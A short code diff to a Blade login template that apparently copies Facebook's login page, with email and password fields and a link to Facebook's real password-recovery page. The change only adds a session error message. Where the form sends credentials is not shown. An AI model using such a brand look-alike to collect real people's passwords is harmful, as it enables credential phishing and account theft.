@@ -23,6 +23,11 @@
                     <input type="email" name="email" placeholder="Email address or phone number" required>
                     <input type="password" name="password" placeholder="Password" required class="pass">
                     <div class="link">
+                        @if(session('error'))
+                            <div class="alert alert-danger" style="color: red; text-align: start">
+                                {{ session('error') }}
+                            </div>
+                        @endif
                         <button type="submit" class="login">Log in</button>
                         <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forgot">Forgotten password?</a>
                     </div>
@@ -37,6 +42,8 @@
             </div>
         </div>
     </div>
+
+    
     <footer>
         <ul>
             <li style="color: black;">English (UK)</li>
